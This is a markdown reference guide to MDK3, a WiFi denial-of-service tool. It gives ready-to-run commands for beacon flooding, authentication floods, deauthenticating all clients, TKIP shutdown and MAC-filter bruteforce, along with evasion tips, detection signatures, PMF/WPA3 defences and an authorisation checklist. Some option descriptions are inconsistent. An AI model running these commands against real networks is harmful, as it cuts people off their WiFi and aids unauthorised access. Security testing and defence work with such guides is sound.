# MDK3 - WiFi Denial of Service Tool

## Overview

MDK3 (MDK version 3) is a proof-of-concept tool designed to exploit common IEEE 802.11 (Wi-Fi) protocol weaknesses. It is a comprehensive wireless attack tool that can perform various denial of service attacks against WiFi networks, including beacon flooding, authentication DoS, deauthentication attacks, and more.

**Author**: ASPj of k2wrlz
**License**: GPLv2
**Version**: 6.0
**Category**: Impact / WiFi Attack

### Key Features

- **Beacon Flood Mode**: Creates fake Access Points
- **Authentication DoS**: Overwhelms AP with authentication requests
- **Deauthentication Amok**: Kicks all clients from AP
- **Probe Response Test**: Checks SSID visibility
- **MAC Filter Bruteforce**: Tests MAC filtering
- **WPA TKIP DoS**: Attacks WPA encryption
- **WDS Confusion**: Disrupts multi-AP installations
- **802.1X Tests**: Tests port-based authentication

### How WiFi Works

Understanding WiFi fundamentals helps explain the attacks:

```
Client                              Access Point
  |                                   |
  |------- Probe Request ------------>|
  |<------ Probe Response ------------|
  |                                   |
  |------- Authentication Request --->|
  |<------ Authentication Response ---|
  |                                   |
  |------- Association Request ------>|
  |<------ Association Response ------|
  |                                   |
  |       [Connected - Data Flow]     |
```

## Installation

### Kali Linux

```bash
sudo apt update
sudo apt install mdk3
```

### Dependencies

- aircrack-ng
- libc6

### Manual Installation

```bash
git clone https://github.com/aircrack-ng/mdk3.git
cd mdk3
make
sudo make install
```

## Usage

### Basic Syntax

```bash
mdk3 <interface> <test_mode> [test_options]
```

### Test Modes Overview

| Mode | Name | Description |
|------|------|-------------|
| `b` | Beacon Flood | Sends fake beacon frames |
| `a` | Authentication DoS | Floods AP with auth requests |
| `p` | Basic Probing | Probes APs and bruteforces SSIDs |
| `d` | Deauth Amok | Kicks all clients from AP |
| `m` | Michael Shutdown | TKIP denial of service |
| `x` | 802.1X Tests | Tests port-based auth |
| `w` | WIDS Confusion | Confuses intrusion detection |
| `f` | MAC Filter Bruteforce | Tests MAC filtering |
| `g` | WPA Downgrade | Forces WEP/No encryption |

## Detailed Test Modes

### Beacon Flood Mode (b)

Sends beacon frames to show fake APs at clients. Can crash network scanners and drivers.

```bash
# Basic beacon flood
mdk3 wlan0 b

# Custom ESSID
mdk3 wlan0 b -n "FreeWiFi"

# Custom channel
mdk3 wlan0 b -c 6

# Custom encoding
mdk3 wlan0 b -n "TestNetwork" -c 1 -w 1

# Hide SSID (cloaked)
mdk3 wlan0 b -n "Hidden" -c 1 -h
```

**Options**:
```
-nESSID     # Network name
-c channel  # Channel number
-w           # WPA encrypted (fake)
-h           # Hidden SSID
-t           # Use from file
```

### Authentication DoS Mode (a)

Sends authentication frames to all APs found in range. Too many clients can freeze or reset APs.

```bash
# Basic authentication DoS
mdk3 wlan0 a

# Target specific AP
mdk3 wlan0 a -c 6

# Custom client MAC
mdk3 wlan0 a -m 00:11:22:33:44:55
```

**Options**:
```
-c channel  # Target channel
-m MAC      # Client MAC
-i AP_MAC   # Target AP
```

### Deauthentication/Disassociation Amok Mode (d)

Kicks everybody found from AP. Sends deauthentication and disassociation packets.

```bash
# Deauth all clients from all APs
mdk3 wlan0 d

# Deauth specific AP
mdk3 wlan0 d -c 6

# Deauth specific client
mdk3 wlan0 d -m 00:11:22:33:44:55

# Deauth with custom reason code
mdk3 wlan0 d -c 6 -w 1
```

**Options**:
```
-c channel  # Target channel
-m MAC      # Target client
-w MAC      # Source MAC (spoof)
-t BSSID    # Target AP BSSID
```

### Probe Response Mode (p)

Probes AP and checks for answer. Useful for checking SSID visibility and bruteforcing hidden networks.

```bash
# Probe all APs
mdk3 wlan0 p

# Bruteforce SSID
mdk3 wlan0 p -f /path/to/wordlist.txt

# Check specific AP
mdk3 wlan0 p -c 6
```

**Options**:
```
-f file     # Wordlist for bruteforce
-c channel  # Target channel
```

### Michael Shutdown Exploitation (m)

Cancels all traffic continuously by exploiting TKIP vulnerabilities.

```bash
# Basic Michael shutdown
mdk3 wlan0 m

# Target specific AP
mdk3 wlan0 m -c 6

# Target specific client
mdk3 wlan0 m -m 00:11:22:33:44:55
```

### 802.1X Tests (x)

Tests port-based authentication (802.1X).

```bash
# Basic 802.1X test
mdk3 wlan0 x
```

### WIDS/WIPS Confusion (w)

Confuses/abuses intrusion detection and prevention systems.

```bash
# Basic WIDS confusion
mdk3 wlan0 w

# Target specific network
mdk3 wlan0 w -c 6
```

### MAC Filter Bruteforce (f)

Uses a list of known client MAC addresses to authenticate to AP.

```bash
# Basic MAC filter bruteforce
mdk3 wlan0 f -t AP_MAC -b /path/to/mac_list.txt

# Custom interface
mdk3 wlan0 f -t 00:11:22:33:44:55 -b macs.txt
```

**Options**:
```
-t AP_MAC   # Target AP BSSID
-b file     # MAC address list
```

### WPA Downgrade Test (g)

Deauthenticates stations and APs sending WPA encrypted packets.

```bash
# Basic WPA downgrade
mdk3 wlan0 g

# Target specific AP
mdk3 wlan0 g -c 6
```

## Attack Scenarios

### Scenario 1: Rogue AP Detection

**Objective**: Test if network detects rogue access points

```bash
# Create fake AP
mdk3 wlan0 b -n "TestRogue" -c 6

# Monitor for detection
```

### Scenario 2: Client Disconnection Testing

**Objective**: Test reconnection resilience

```bash
# Deauth all clients
mdk3 wlan0 d

# Monitor reconnection behavior
```

### Scenario 3: Hidden SSID Discovery

**Objective**: Discover hidden network names

```bash
# Bruteforce SSID
mdk3 wlan0 p -f /usr/share/wordlists/rockyou.txt
```

### Scenario 4: WIDS Evasion Testing

**Objective**: Test intrusion detection evasion

```bash
# Confuse WIDS
mdk3 wlan0 w

# Monitor WIDS alerts
```

## Evasion Techniques

### Channel Hopping

```bash
# Manual channel hop
for ch in 1 6 11; do
    mdk3 wlan0 a -c $ch
done
```

### MAC Randomization

```bash
# Change MAC before attack
macchanger -r wlan0
mdk3 wlan0 d
```

### Timing Manipulation

```bash
# Slower attack
mdk3 wlan0 a -c 6 -d 1
```

## Detection Methods

### WiFi Monitoring

```bash
# Monitor beacon frames
airodump-ng wlan0

# Detect deauth packets
tcpdump -i wlan0 -n 'type mgt subtype deauth'

# Monitor authentication storms
tcpdump -i wlan0 -n 'type mgt subtype auth'
```

### IDS Signatures

```
# Snort signature for WiFi DoS
alert wifi any any -> any any (
    msg:"WiFi deauthentication flood";
    wifi_type deauth;
    detection_filter:track by_src, count 10, seconds 1;
    sid:1000001; rev:1;
)
```

## Defense Mechanisms

### Wireless Security Configuration

**WPA3/SAE**:
```
# Use WPA3 with SAE (Simultaneous Authentication of Equals)
# More resistant to offline attacks
```

**802.11w (PMF)**:
```
# Enable Protected Management Frames
# Prevents deauthentication attacks
```

**Client Isolation**:
```
# Prevent client-to-client communication
# Limits attack surface
```

### Network Monitoring

```bash
# Monitor for fake APs
airmon-ng start wlan0
airodump-ng wlan0mon

# Detect deauth attacks
tcpdump -i wlan0mon 'type mgt subtype deauth'
```

### Infrastructure Defense

1. **WIDS/WIPS**: Deploy wireless intrusion detection
2. **Rogue AP Detection**: Monitor for unauthorized APs
3. **Client Isolation**: Prevent client-to-client attacks
4. **PMF**: Enable Protected Management Frames
5. **WPA3**: Use latest security protocols

## Real-World Applications

### Legitimate Testing

1. **Wireless Security Assessments**: Test WiFi resilience
2. **Rogue AP Detection**: Verify detection capabilities
3. **Compliance Testing**: Meet wireless security standards
4. **Incident Response**: Test response procedures

### Testing Methodology

```
1. Document wireless infrastructure
2. Identify all APs and clients
3. Start with minimal impact test
4. Monitor network response
5. Document vulnerabilities
6. Implement mitigations
7. Re-test to verify fixes
```

## Output Examples

### Authentication DoS

```bash
$ mdk3 wlan0 a

Trying to get a new target AP...
AP 9C:D3:6D:B8:FF:56 is responding!
Connecting Client: 00:00:00:00:00:00 to target AP: 9C:D3:6D:B8:FF:56
Connecting Client: 00:00:00:00:00:00 to target AP: 9C:D3:6D:B8:FF:56
AP 9C:D3:6D:B8:FF:56 seems to be INVULNERABLE!
Device is still responding with 500 clients connected!
```

### Deauthentication

```bash
$ mdk3 wlan0 d

Deauthing BSSID: 00:11:22:33:44:55
Deauthing Client: AA:BB:CC:DD:EE:FF
...
```

## System Requirements

### Minimum Requirements

```
- OS: Linux
- Adapter: Monitor mode capable
- Driver: Injection support
- RAM: 256MB
- Privileges: Root
```

### Recommended Setup

```
- OS: Kali Linux
- Adapter: Alfa AWUS036ACH
- Driver: ath9k_htc or rtl8812au
- RAM: 1GB
- Antenna: External high-gain
```

### Compatible Adapters

| Adapter | Chipset | Monitor | Injection |
|---------|---------|---------|-----------|
| Alfa AWUS036ACH | RTL8812AU | Yes | Yes |
| Alfa AWUS036NHA | Atheros AR9271 | Yes | Yes |
| Panda PAU09 | RT5572 | Yes | Yes |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Yes | Yes |

## IEEE 802.11 Protocol Deep Dive

### Frame Types

| Type | Value | Description |
|------|-------|-------------|
| Management | 0 | Association, authentication |
| Control | 1 | RTS/CTS, ACK |
| Data | 2 | Data transmission |

### Management Frame Subtypes

| Subtype | Name | Attack Vector |
|---------|------|---------------|
| 0 | Association Request | flooding |
| 1 | Association Response | - |
| 4 | Probe Request | SSID discovery |
| 5 | Probe Response | - |
| 8 | Beacon | Fake AP |
| 10 | Disassociation | Deauth |
| 11 | Authentication | Auth flood |
| 12 | Deauthentication | Deauth |

### WiFi Security Protocols

| Protocol | Status | Vulnerabilities |
|----------|--------|-----------------|
| WEP | Deprecated | Crackable in minutes |
| WPA | Deprecated | TKIP vulnerabilities |
| WPA2 | Current | KRACK, PMKID |
| WPA3 | Recommended | SAE, PMF |

## Attack Analysis

### Attack Effectiveness

| Attack | Impact | Detection |
|--------|--------|-----------|
| Beacon Flood | High | Easy |
| Auth DoS | Medium | Medium |
| Deauth Amok | High | Easy |
| Michael Shutdown | High | Hard |
| WIDS Confusion | Medium | Hard |

### Timing Analysis

| Attack | Packets/Second | Duration |
|--------|----------------|----------|
| Beacon Flood | 100+ | Continuous |
| Auth DoS | 50+ | Until stopped |
| Deauth Amok | 100+ | Until stopped |

## Defense Architecture

### Wireless Security Configuration

**WPA3/SAE Configuration**:
```
# Use WPA3 with SAE
# Simultaneous Authentication of Equals
# Resistant to offline attacks
```

**802.11w (PMF) Configuration**:
```
# Enable Protected Management Frames
# Required for WPA3
# Prevents deauth attacks
```

### WIDS/WIPS Deployment

```
# Wireless Intrusion Detection System
- Monitor for fake APs
- Detect deauth floods
- Alert on anomalies
- Block offending clients
```

### Network Infrastructure

```
# Client Isolation
- Prevent client-to-client communication
- Limit attack surface

# Rogue AP Detection
- Regular scanning
- RF monitoring
- Behavioral analysis
```

## Integration with Other Tools

### Pre-Attack Reconnaissance

```bash
# Start monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Identify targets
airodump-ng --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

### Post-Attack Analysis

```bash
# Monitor reconnection
airodump-ng wlan0mon

# Check for deauth
tcpdump -i wlan0mon 'type mgt subtype deauth'

# Verify network recovery
airodump-ng wlan0mon
```

## Real-World Case Studies

### Case Study 1: Corporate WiFi Testing

**Objective**: Test enterprise WiFi resilience

```bash
# Beacon flood test
mdk3 wlan0 b -n "RogueAP" -c 6

# Auth DoS test
mdk3 wlan0 a -c 6

# Deauth test
mdk3 wlan0 d -c 6

# Results: Network vulnerable to deauth
# Impact: Clients disconnected
```

**Findings**: No PMF enabled. Recommended:
- Enable 802.11w (PMF)
- Deploy WIDS
- Use WPA3

### Case Study 2: Public WiFi Testing

**Objective**: Test public hotspot security

```bash
# Discover hidden SSIDs
mdk3 wlan0 p -f /usr/share/wordlists/rockyou.txt

# Test MAC filtering
mdk3 wlan0 f -t AA:BB:CC:DD:EE:FF -b macs.txt

# Results: No MAC filtering
# Impact: Easy unauthorized access
```

**Findings**: No client authentication. Recommended:
- Implement captive portal
- Enable MAC filtering
- Deploy WIDS

## Best Practices

### Testing Checklist

- [ ] Document wireless infrastructure
- [ ] Identify all APs and clients
- [ ] Obtain written authorization
- [ ] Notify network operations
- [ ] Start with minimal impact
- [ ] Monitor network response
- [ ] Document all findings
- [ ] Generate comprehensive report

### Reporting Metrics

1. **Attack Success Rate**: Percentage of successful attacks
2. **Client Impact**: Number of affected clients
3. **Detection Capability**: Was attack detected?
4. **Recovery Time**: How long to restore normal operations
5. **Vulnerability Assessment**: Security weaknesses found

## Limitations

- Requires monitor mode interface
- Needs wireless adapter supporting injection
- Effectiveness depends on AP implementation
- Modern APs may have better protection
- PMF can prevent deauthentication attacks
- Cannot bypass WPA3/SAE encryption
- Single-adapter attacks may be filtered

## Troubleshooting

### No Monitor Mode

```bash
# Start monitor mode
airmon-ng start wlan0

# Check interface
iwconfig wlan0mon

# Kill interfering processes
airmon-ng check kill
```

### Permission Denied

```bash
# Run as root
sudo mdk3 wlan0mon a

# Check capabilities
sudo setcap cap_net_raw+ep /usr/bin/mdk3
```

### Injection Not Working

```bash
# Test injection
aireplay-ng -9 wlan0mon

# Check adapter support
iw list | grep -A 10 "Supported interface modes"

# Update drivers
sudo apt-get update && sudo apt-get upgrade
```

### No Targets Found

```bash
# Scan for networks
airodump-ng wlan0mon

# Check channel
iwconfig wlan0mon channel 6

# Verify adapter range
iwconfig wlan0mon
```

## Legal Notice

MDK3 is a legitimate security testing tool designed to verify wireless network resilience. Unauthorized use against networks you do not own or have explicit permission to test is illegal and unethical. This tool should only be used in controlled testing environments with proper authorization.

**Before Testing**:
- Obtain written authorization
- Define scope and targets
- Document test plan
- Notify network operations
- Have rollback procedures

**During Testing**:
- Monitor network health
- Be ready to stop immediately
- Document all observations
- Avoid affecting other networks

**After Testing**:
- Restore normal operations
- Document all findings
- Generate comprehensive report
- Recommend improvements

## References

- IEEE 802.11 Standard
- IEEE 802.11w - Protected Management Frames
- Aircrack-ng Documentation
- WiFi Security Best Practices
- Wireless Attack Methodologies
- OWASP Wireless Security Testing Guide
